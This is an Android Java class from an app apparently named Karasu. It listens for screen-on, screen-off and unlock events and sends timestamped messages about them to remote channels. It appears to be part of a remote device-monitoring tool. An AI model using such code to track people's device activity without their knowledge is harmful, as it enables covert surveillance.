package com.tenix.karasu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (krs.instance == null) return;

        String action = intent.getAction();
        if (action == null) return;

        String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
        String msg;
        switch (action) {
            case Intent.ACTION_SCREEN_ON:
                msg = "🌟 *Screen ON* — " + time; break;
            case Intent.ACTION_SCREEN_OFF:
                msg = "🌑 *Screen OFF* — " + time; break;
            case Intent.ACTION_USER_PRESENT:
                msg = "🔓 *Device Unlocked* — " + time; break;
            default:
                return;
        }

        for (String ch : krs.instance.parseChannels()) {
            krs.instance.sendText(msg, ch);
        }
    }
}
